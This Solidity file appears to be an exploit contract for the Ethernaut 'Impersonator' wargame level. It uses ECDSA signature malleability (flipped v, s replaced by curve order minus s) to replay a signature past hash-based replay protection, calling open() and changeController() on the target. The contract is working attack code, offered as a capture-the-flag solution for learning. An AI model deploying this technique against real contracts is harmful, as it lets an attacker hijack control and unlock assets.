// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/**
 * @title ImpersonatorAttack
 * @notice Exploit contract for Ethernaut Level 32 - Impersonator
 * 
 * VULNERABILITY: ECDSA Signature Malleability
 * 
 * For any valid ECDSA signature (v, r, s), there exists a malleable signature
 * (v', r, s') that also recovers to the same address:
 *   - v' = v XOR 1 (flips between 27 and 28)
 *   - s' = secp256k1.n - s
 * 
 * The ECLocker contract tracks used signatures by hash:
 *   signatureHash = keccak256(abi.encode([r, s, v]))
 * 
 * Since the malleable signature has different (v', s'), its hash is different,
 * bypassing the replay protection while still being a valid signature!
 * 
 * EXPLOIT:
 * 1. Get the original signature used to initialize the locker
 * 2. Compute the malleable signature (v', r, n-s)
 * 3. Call open() with the malleable signature
 */

interface IECLocker {
    function open(uint8 v, bytes32 r, bytes32 s) external;
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
    function controller() external view returns (address);
    function msgHash() external view returns (bytes32);
    function usedSignatures(bytes32) external view returns (bool);
}

contract ImpersonatorAttack {
    // secp256k1 curve order
    uint256 constant SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
    
    IECLocker public target;
    
    event AttackExecuted(uint8 originalV, bytes32 r, bytes32 originalS, uint8 malleableV, bytes32 malleableS);
    
    constructor(address _target) {
        target = IECLocker(_target);
    }
    
    /**
     * @notice Compute the malleable signature from an original signature
     * @param v Original recovery id (27 or 28)
     * @param r Original r value
     * @param s Original s value
     * @return malleableV The flipped v value
     * @return malleableR The r value (unchanged)
     * @return malleableS The n - s value
     */
    function getMalleableSignature(uint8 v, bytes32 r, bytes32 s) 
        public 
        pure 
        returns (uint8 malleableV, bytes32 malleableR, bytes32 malleableS) 
    {
        // Flip v: 27 -> 28 or 28 -> 27
        malleableV = v == 27 ? 28 : 27;
        
        // r stays the same
        malleableR = r;
        
        // s' = n - s
        malleableS = bytes32(SECP256K1_N - uint256(s));
    }
    
    /**
     * @notice Execute the attack using the malleable signature
     * @param originalV Original v from the initialization signature
     * @param r The r value (same for both signatures)
     * @param originalS Original s from the initialization signature
     */
    function attack(uint8 originalV, bytes32 r, bytes32 originalS) external {
        // Compute malleable signature
        (uint8 malleableV, , bytes32 malleableS) = getMalleableSignature(originalV, r, originalS);
        
        // Verify the malleable signature hasn't been used
        bytes32 malleableHash = keccak256(abi.encode([uint256(r), uint256(malleableS), uint256(malleableV)]));
        require(!target.usedSignatures(malleableHash), "Malleable signature already used");
        
        // Call open() with the malleable signature
        target.open(malleableV, r, malleableS);
        
        emit AttackExecuted(originalV, r, originalS, malleableV, malleableS);
    }
    
    /**
     * @notice Change controller using malleable signature
     * @param originalV Original v
     * @param r The r value
     * @param originalS Original s
     * @param newController New controller address to set
     */
    function attackChangeController(
        uint8 originalV, 
        bytes32 r, 
        bytes32 originalS,
        address newController
    ) external {
        (uint8 malleableV, , bytes32 malleableS) = getMalleableSignature(originalV, r, originalS);
        target.changeController(malleableV, r, malleableS, newController);
    }
    
    /**
     * @notice Verify that a malleable signature recovers to the same address
     * @param msgHash The message hash
     * @param originalV Original v
     * @param r The r value
     * @param originalS Original s
     */
    function verifyMalleability(bytes32 msgHash, uint8 originalV, bytes32 r, bytes32 originalS) 
        external 
        pure 
        returns (
            address originalSigner,
            address malleableSigner,
            bool signaturesMatch
        ) 
    {
        // Recover with original signature
        originalSigner = ecrecover(msgHash, originalV, r, originalS);
        
        // Compute and recover with malleable signature
        (uint8 malleableV, , bytes32 malleableS) = getMalleableSignature(originalV, r, originalS);
        malleableSigner = ecrecover(msgHash, malleableV, r, malleableS);
        
        signaturesMatch = (originalSigner == malleableSigner) && (originalSigner != address(0));
    }
    
    /**
     * @notice Check if attack is possible (malleable signature not yet used)
     */
    function canAttack(uint8 originalV, bytes32 r, bytes32 originalS) external view returns (bool) {
        (uint8 malleableV, , bytes32 malleableS) = getMalleableSignature(originalV, r, originalS);
        bytes32 malleableHash = keccak256(abi.encode([uint256(r), uint256(malleableS), uint256(malleableV)]));
        return !target.usedSignatures(malleableHash);
    }
    
    /**
     * @notice Get current state of the target locker
     */
    function getTargetState() external view returns (
        address controller,
        bytes32 msgHash
    ) {
        controller = target.controller();
        msgHash = target.msgHash();
    }
}
